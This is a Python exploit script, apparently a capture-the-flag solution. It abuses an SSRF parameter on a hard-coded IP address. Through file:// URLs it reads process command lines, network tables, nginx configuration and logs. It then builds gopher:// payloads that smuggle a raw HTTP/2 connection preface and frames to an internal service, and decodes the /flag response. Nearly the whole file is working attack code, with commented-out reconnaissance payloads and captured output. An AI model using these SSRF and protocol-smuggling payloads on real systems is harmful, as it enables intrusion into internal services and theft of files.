#!/usr/bin/env python3
# -*- coding:utf-8 -*-
from urllib.parse import *
from hpack import Encoder, Decoder
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/01/28, 23:23
"""

import requests
import urllib3
from hyperframe.frame import *
urllib3.disable_warnings()

URL = 'https://40.73.33.181'

req = requests.Session()
req.verify = False
req.cert = False


def ssrf(url):
    url = URL+"/?url="+url
    print(url)
    res = req.get(url)
    try:
        if res.status_code == 200:
            html = res.content.decode('utf-8')
            return html[html.find('</code>')+7:]
    except Exception as e:
        return res.content[res.content.find(b'</code>')+7:]


def defuck(data):
    next_f = 0
    errn = 0
    while len(data) > next_f+9:
        if errn > 2:
            break
        try:
            nframe, _len = Frame.parse_frame_header(
                data[next_f:next_f+9])
            nframe.parse_body(memoryview(data[next_f+9:next_f+9 + _len]))
            print(nframe)
            for i in nframe.__dict__:
                if i == 'data':
                    data = nframe.data
                    dd = Decoder()
                    print('frame->data->decode : ', dd.decode(data))
            next_f += _len + 9
        except Exception as e:
            print(e)
            errn += 1
            next_f += _len + 9
            continue


def fuck(path):
    settings = []
    f = SettingsFrame(0)
    f.settings = {
        f.HEADER_TABLE_SIZE: 0xff,
        f.ENABLE_PUSH: 0,
        f.MAX_CONCURRENT_STREAMS: 5,
        f.INITIAL_WINDOW_SIZE: 0xff,
        f.MAX_HEADER_LIST_SIZE: 0xff
    }
    # settings.append(f.serialize())
    # f = WindowUpdateFrame(1)
    settings.append(f.serialize())
    f = HeadersFrame(1)
    f.flags.add('END_STREAM')
    f.flags.add('END_HEADERS')
    header_data = [
        (':method', 'GET'),
        (':scheme', 'http'),
        (':path', '/'+path),
        (':authority', '127.0.0.1:8080'),
        ('cookie', 'v'),
        ('accept', '*')
    ]
    ee = Encoder()
    f.data = ee.encode(header_data)
    settings.append(f.serialize())
    data = b''.join(settings)
    return quote(data)


if __name__ == '__main__':
    # pl = 'file:///proc/1/cmdline'
    # bash /stat.sh
    # pl = 'file:///proc/18/cmdline'
    # nginx: master process /usr/sbin/nginx
    # for i in range(1, 30):
    #     print(i)
    #     pl = 'file:///proc/%d/cmdline' % i
    #     r = ssrf(pl)
    #     print(r)
    # pl = 'file:////stat.sh'
    # with open('tcp', 'w') as f:
    #     f.write(ssrf('file:///proc/net/tcp'))
    # pl = 'file:///etc/nginx/nginx.conf'
    # print(ssrf(pl))
    # 172.20.0.3:8080
    # access_log /var/log/nginx/access.log;
    # error_log /var/log/nginx/error.log;
    # include /etc/nginx/conf.d/*.conf;
    # include /etc/nginx/sites-enabled/*;
    # pl = 'file:///etc/nginx/sites-enabled/default'
    # ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
    # ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
    # /var/www/html
    # pl = 'http://172.20.0.3:8080/flag'
    # print(ssrf(pl))
    # hpackd = Decoder()
    # q = b'\x00\x00\x12\x04\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x80\x00\x04\x00\x01\x00\x00\x00\x05\x00\xff\xff\xff\x00\x00\x04\x08\x00\x00\x00\x00\x00\x7f\xff\x00\x00\x00\x00\x08\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01'
    # print(hpackd.decode(q))
    # pl = 'http://172.20.0.3:8080/flag'
    # pl = 'gopher://172.20.0.3:8080/_GET%2520/flag%2020HTTP/2.0%250a%250dHost:172.20.0.3:8080%250a%250d%250a%250d'
    # pl = 'file:///var/log/nginx/access.log'
    # ==============
    # #
    pl = 'gopher://172.20.0.3:8080/_'
    # 连接序言 PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n
    pl += quote(quote('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'))
    # 帧 SETTINGS[]
    pl += quote(fuck(''))
    # print(pl)
    r = ssrf(pl)
    # # r = b'\x00\x00\x00\x04\x01\x00\x00\x00\x00\x00\x00\x04\x03\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x91\x01\x04\x00\x00\x00\x01 \x88v\x91\xaacU\xe5\x80\xae\x16\x97\x02\x9f\xd7\x08\xed\xa96\xff\x7fa\x96\xd0z\xbe\x94\x13\xcae\x1dJ\x08\x01}@\xbdq\x91\\\x13*b\xd1\xbf_\x92I|\xa5\x89\xd3M\x1fj\x12q\xd8\x82\xa6\x0e\x1b\xf0\xac\xf7\x00\x87AR\xb1\x0e~\xa6/\xc6\xc2\x11\xcdrZ\x077\xff\xeciMb\x8b@\xfa\xb3\x10\xe2\xbeie-\x8c\xd4B\xff\xfb\x04\x85\xa0\xa9,\x9fj\x17\xcdf\xb0\xa8\x83|\xf6\xfd(\x00\xad\x94u,\x17\xdd\x02\x80\x05\xc0\x02\xe0\x02\xa6-\x1b\xfe\xd4\xd0?+C1`\x07\x00\x00\x10\x00\x01\x00\x00\x00\x01U hav3 g0t Me!!!\x00\x00\x08\x07\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01'
    # # r = b'\x00\x00\x12\x04\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x80\x00\x04\x00\x01\x00\x00\x00\x05\x00\xff\xff\xff\x00\x00\x04\x08\x00\x00\x00\x00\x00\x7f\xff\x00\x00\x00\x00\x00\x04\x01\x00\x00\x00\x00\x00\x00\x04\x03\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x91\x01\x04\x00\x00\x00\x01 \x88v\x91\xaacU\xe5\x80\xae\x16\x97\x02\x9f\xd7\x08\xed\xa96\xff\x7fa\x96\xd0z\xbe\x94\x13\xcae\x1dJ\x08\x01}@\xbdq\x91\\\x13*b\xd1\xbf_\x92I|\xa5\x89\xd3M\x1fj\x12q\xd8\x82\xa6\x0e\x1b\xf0\xac\xf7\x00\x87AR\xb1\x0e~\xa6/\xc6\xc2\x11\xcdrZ\x077\xff\xeciMb\x8b@\xfa\xb3\x10\xe2\xbeie-\x8c\xd4B\xff\xfb\x04\x85\xa0\xa9,\x9fj\x17\xcdf\xb0\xa8\x83|\xf6\xfd(\x00\xad\x94u,\x17\xdd\x02\x80\x05\xc0\x02\xe0\x02\xa6-\x1b\xfe\xd4\xd0?+C1`\x07\x00\x00\x10\x00\x01\x00\x00\x00\x01U hav3 g0t Me!!!\x00\x00\x08\x07\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01'

    # r = b'\x00\x00\x12\x04\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x80\x00\x04\x00\x01\x00\x00\x00\x05\x00\xff\xff\xff\x00\x00\x04\x08\x00\x00\x00\x00\x00\x7f\xff\x00\x00\x00\x00\x08\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01'
    defuck(r)
